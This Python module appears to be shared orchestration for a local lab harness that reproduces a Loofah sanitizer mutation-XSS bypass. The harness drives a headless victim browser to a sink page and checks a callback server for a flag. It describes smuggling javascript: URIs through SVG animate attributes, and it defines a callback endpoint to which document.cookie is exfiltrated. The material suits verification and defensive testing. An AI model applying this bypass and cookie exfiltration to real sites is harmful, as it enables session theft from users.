#!/usr/bin/env python3
"""Shared orchestration for the Loofah SVG-animate-republish mutation-XSS canary
(CVE-2018-16468 -> CVE-2019-15587).

One "probe" = (1) reset the callback, (2) drive the headless victim to view the Loofah-republish
sink page `/?html=<payload>` on a version and click the SVG link, (3) read the callback. The
observable result is the callback dump; the per-run ${PCB_FLAG} appears there IFF Loofah's
republished output kept a smuggled `javascript:` URI in an SVG <animate> value attribute that
survived the allowlist, so clicking the animated <a> navigated to it and executed (proving
execution, not reflection).

Same sink (Loofah sanitize+republish), same exfil channel for seed and residual; the ONLY
difference is which <animate> value attribute carries the URI (`from` for the seed, `values` for
the residual) and which loofah version (v0/v1/v2) is the guard.

Host ports come from verify.sh (PCB_APP_PORT / PCB_VICTIM_PORT / PCB_CB_PORT) or compose.env.
"""
import os
import time
import urllib.parse
import urllib.request


def _host_port(env_name, default):
    v = os.environ.get(env_name)
    if v and str(v).isdigit():
        return int(v)
    return default


def _app_host_port(version):
    shared = os.environ.get("PCB_APP_PORT") or os.environ.get("PCB_TARGET_PORT")
    if shared and str(shared).isdigit():
        return int(shared)
    return {
        "v0": _host_port("PORT_V0_0", 35020),
        "v1": _host_port("PORT_V1_0", 35021),
        "v2": _host_port("PORT_V2_0", 35022),
    }[version]


def _victim():
    return "http://127.0.0.1:%d" % _host_port("PCB_VICTIM_PORT", _host_port("PORT_VICTIM_0", 35070))


def _callback():
    return "http://127.0.0.1:%d" % _host_port("PCB_CB_PORT", _host_port("PORT_CALLBACK_0", 35090))


# Internal compose URLs the victim browser uses (Docker DNS by service name).
INTERNAL_APP = {"v0": "http://v0", "v1": "http://v1", "v2": "http://v2"}

# Internal callback the exfil payload navigates to. Explicit http:// avoids protocol-relative
# edge cases after javascript: navigation. The flag rides along as document.cookie.
CB = "http://callback:9000/c?f="


def _get(url, timeout=90):
    last = None
    for _ in range(4):
        try:
            with urllib.request.urlopen(url, timeout=timeout) as r:
                return r.read().decode("utf-8", "replace")
        except Exception as e:
            last = e
            time.sleep(2)
    raise last


def _wait_victim(timeout=90):
    """Block until victim /health is ok (grid up). Do not raise — residual still polls callback."""
    deadline = time.time() + timeout
    url = _victim() + "/health"
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(url, timeout=5) as r:
                if r.read().decode("utf-8", "replace").strip() == "ok":
                    return True
        except Exception:
            pass
        time.sleep(2)
    return False


def run_payload(html_payload: str, version: str, visit_mode: str = "click") -> str:
    """Drive the victim to view the sink page with `html_payload` republished on `version`, click
    the SVG link, and return the callback dump (flag lands there iff the smuggled javascript: URI
    survived Loofah's animate-value allowlist and executed on click)."""
    q_app = urllib.parse.urlencode({"html": html_payload})
    target = INTERNAL_APP[version] + "/?" + q_app
    q = urllib.parse.urlencode(
        {"target": target, "origin": INTERNAL_APP[version] + "/", "mode": visit_mode}
    )
    dump = ""
    for _attempt in range(3):
        try:
            _get(_callback() + "/reset")
        except Exception:
            pass
        _wait_victim()
        try:
            _get(_victim() + "/visit?" + q, timeout=90)
        except Exception:
            pass
        for _ in range(8):
            try:
                dump = _get(_callback() + "/dump", timeout=10)
            except Exception:
                dump = ""
            if dump and dump.strip() not in ("", "[]", "{}"):
                return dump
            time.sleep(2)
    return dump


def server_side_render(html_payload: str, version: str) -> str:
    """Return the exact server-side Loofah republish output (via /raw) for the repro log."""
    q = urllib.parse.urlencode({"html": html_payload})
    return _get("http://127.0.0.1:%d/raw?%s" % (_app_host_port(version), q))
